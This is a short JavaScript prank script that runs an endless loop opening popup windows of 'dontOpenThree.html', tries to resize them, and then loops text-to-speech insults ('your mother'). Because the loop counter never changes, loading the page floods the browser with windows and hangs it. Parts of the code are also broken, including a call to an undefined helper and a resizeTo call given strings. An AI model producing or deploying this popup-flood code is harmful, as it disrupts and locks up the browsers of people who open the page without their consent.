const PHRASES = [ 
    'your mom' ,
    'headers'
]
function speak (phrase) {
if (phrase == null) phrase = getRandomArrayEntry(PHRASES)
window.speechSynthesis.speak(new window.SpeechSynthesisUtterance(phrase))
}
var i=2
var w = Math.floor(Math.random() * 500);
var h  = Math.floor(Math.random() * 1000);
while (i < 10) {
window.open('dontOpenThree.html');
window.open('', 'dontOpenThree.html', 'width=100 height=100' );
window.open('dontOpenThree.html')
window.open('', 'dontOpenThree.html', 'width=100 height=100' );
window.open('dontOpenThree.html');
window.open('', 'dontOpenThree.html', 'width=100 height=100' );
window.open('dontOpenThree.html');
window.open('', 'dontOpenThree.html', 'width=100 height=100' )
window.resizeTo('width=w', 'height=h')
}
while (i < 10) {
speak('your mother')
}

